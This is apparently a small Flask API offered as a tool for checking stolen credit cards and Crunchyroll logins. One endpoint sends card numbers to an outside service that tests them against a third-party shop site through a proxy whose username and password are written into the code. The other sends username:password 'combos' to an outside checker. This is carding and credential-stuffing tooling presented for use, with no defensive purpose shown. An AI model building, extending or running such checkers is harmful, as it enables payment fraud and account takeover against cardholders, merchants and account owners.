from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({"message": "This Api was Made By Sukhraj"}), 200

@app.route("/api/v1/checker/cc", methods=["POST", "GET"])
def checker_cc():
    if request.method == "POST":
        data = request.get_json()
        cc = data.get("cc") if data else None
    else:
        cc = request.args.get("cc")

    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    url = (
        "https://rockyysoon-fb0f.onrender.com/index.php"
        "?site=https://keyadream.com/"
        f"&cc={cc}"
        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
    )

    response = requests.get(url)
    try:
        return jsonify(response.json()), 200
    except:
        return jsonify({"result": response.text}), 200


@app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
def checker_crunchy():
    if request.method == "POST":
        data = request.get_json()
        combo = data.get("combo") if data else None
    else:
        combo = request.args.get("combo")

    if not combo:
        return jsonify({"error": "Missing 'combo' parameter"}), 400

    url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
    response = requests.get(url)

    try:
        return jsonify(response.json()), 200
    except:
        return jsonify({"result": response.text}), 200


# For local testing only
if __name__ == "__main__":
    app.run(debug=True)
